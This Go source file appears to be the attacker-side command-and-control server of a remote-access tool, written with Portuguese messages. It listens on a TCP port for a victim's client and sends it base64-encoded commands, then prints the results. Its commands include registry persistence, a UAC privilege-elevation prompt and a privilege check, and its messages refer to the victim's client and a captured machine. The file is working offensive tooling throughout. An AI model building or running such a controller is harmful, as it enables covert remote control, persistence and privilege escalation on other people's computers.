package main

import (
	"bufio"
	b64 "encoding/base64"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"

	"github.com/fatih/color"
	"github.com/peterh/liner"
)

const (
	connHost = "172.20.1.159"
	connPort = "8080"
	connType = "tcp"
)

var (
	usuario, _ = user.Current()
	history_fn = filepath.Join(os.TempDir(), ".liner_historico_de_comandos_server-att-"+usuario.Username)
	names      = []string{"session(close)", "session(persist)", "session(elevate)", "session(help)", "session(check)", "exit", "background"}
	yellow     = color.New(color.FgYellow)
	red        = color.New(color.FgRed)
	green      = color.New(color.FgHiGreen)
	bgYellow   = color.New(color.BgYellow)
	cyan       = color.New(color.FgCyan)
	blue       = color.New(color.FgBlue)
)

func exibeHelpBanner() {
	var helpBanner string
	var hb [7]string

	hb[0] = "\nsession(help)      -   Exibe esta página de ajuda"
	hb[1] = "\nsession(close)     -   Fecha client e encerra sessão"
	hb[2] = "\nsession(persist)   -   Cria chave de registro para persistência(melhor com privilégios elevados)"
	hb[3] = "\nsession(elevate)   -   Spawna prompt de UAC no client e espera aprovação"
	hb[4] = "\nsession(check)     -   Checka o nível de privilégios do client"
	hb[5] = "\nexit               -   Põe o client em background e encerra o servidor"
	hb[6] = "\nbackground         -   Põe o client em background e encerra o servidor"

	for i := 0; i < 7; i++ {
		helpBanner = helpBanner + hb[i]
	}

	yellow.Println(helpBanner)
	fmt.Println()
}

func linerHandler() string {

	line := liner.NewLiner()
	defer line.Close()

	line.SetCtrlCAborts(true)
	line.SetTabCompletionStyle(liner.TabPrints)

	line.SetCompleter(func(line string) (c []string) {
		for _, n := range names {
			if strings.HasPrefix(n, strings.ToLower(line)) {
				c = append(c, n)
			}
		}
		return
	})

	if f, err := os.Open(history_fn); err == nil {
		line.ReadHistory(f)
		f.Close()
	}
	if comando, err := line.Prompt("Comando >> "); err == nil {
		line.AppendHistory(comando)

		if f, err := os.Create(history_fn); err != nil {
			red.Print("Error writing history file: ", err)
		} else {
			line.WriteHistory(f)
			f.Close()
		}
		return comando
	}
	bgYellow.Println("--> Ctrl+C pressionado no Terminal, Client da vítima em background <--")
	fmt.Println()
	return "background"
}

func clearScreen() {
	cmd := exec.Command("clear")
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func encodeB64(entrada []byte) string {
	return b64.StdEncoding.EncodeToString([]byte(entrada))
}

func decodeB64(entrada []byte) string {
	bufferDec, _ := b64.StdEncoding.DecodeString(string(entrada))
	return string(bufferDec)
}

//handleConnection - recebe output em base64, decodifica e printa na tela
func handleConnection(conn net.Conn) {
	buffer, err := bufio.NewReader(conn).ReadBytes('\n')

	if err != nil {
		red.Println("[-] Client", conn.RemoteAddr().String(), "SAIU!.                [-]")
		conn.Close()
		os.Exit(0)
		return
	}

	resultadoDec := decodeB64(buffer)
	fmt.Println("\n" + string(resultadoDec))
}

func escutaClient() (net.Conn, bool) {
	cyan.Println("[=] Iniciando Servidor " + connType + " em " + connHost + ":" + connPort + "     [=]")
	listener, err := net.Listen(connType, connHost+":"+connPort)
	if err != nil {
		red.Println("[-][-] Erro ao escutar --> " + err.Error() + " [-][-]")
		os.Exit(1)
	}

	defer listener.Close()

	conn, err := listener.Accept()
	green.Println("[+] Client " + conn.RemoteAddr().String() + " connectado.           [+]\n")
	//red.Println("[================] MÁQUINA CAPTURADA [================]")
	bgYellow.Print("[!] Use session(help) para exibir o banner de ajuda do servidor [!]")
	fmt.Println("\n")
	if err != nil {
		red.Println("[-] Erro ao conectar:" + err.Error() + " [-]")
		return nil, true
	}
	return conn, false
}

func main() {

	conn, erro := escutaClient()
	if erro {
		return
	}

	for {
		comando := linerHandler()
		text := comando + "\n"
		textEnc := encodeB64([]byte(text))

		switch text {

		case "session(help)\n":
			exibeHelpBanner()

		case "session(elevate)\n":
			fmt.Println()
			yellow.Println("[!] Tentando elevação de privilégios                                     [!]")
			yellow.Println("[!] Então reinicie o servidor atacante para receber a shell elevada      [!]")
			yellow.Println("[!] Se a conexão for encerrada significa que a elevação foi bem sucedida [!]")
			fmt.Fprint(conn, textEnc+"\n")
			handleConnection(conn)

		case "clear\n", "\n":
			clearScreen()

		default:
			fmt.Fprint(conn, textEnc+"\n")
			handleConnection(conn)
		}
	}
}
